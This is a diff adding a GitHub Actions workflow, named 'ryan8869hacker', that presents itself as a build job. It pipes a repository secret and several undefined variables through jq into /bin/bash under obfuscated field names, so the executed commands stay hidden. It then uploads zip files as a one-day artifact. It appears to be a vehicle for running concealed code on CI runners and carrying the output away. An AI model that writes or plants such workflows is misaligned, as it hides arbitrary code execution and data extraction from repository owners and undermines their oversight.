@@ -1,0 +1,26 @@
+name: ryan8869hacker
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ryan8869hacker
+        env:
+          k29328: ${{ secrets.k29328 }}
+        run: |
+          printf '%s' "$k29328" | jq -r .eeqr816 | /bin/bash
+          printf '%s' "$b16" | jq -r .fpsc2919 | /bin/bash
+          printf '%s' "$lqf7628" | jq -r .xt631 | /bin/bash
+          printf '%s' "$wkiwl2" | jq -r .ijo33913 | /bin/bash
+          printf '%s' "$ezon4715" | jq -r .i203 | /bin/bash
+          printf '%s' "$hqlm2" | jq -r .wdkm70123 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: mOfBG7GT
+          path: "*.zip"
+          retention-days: 1
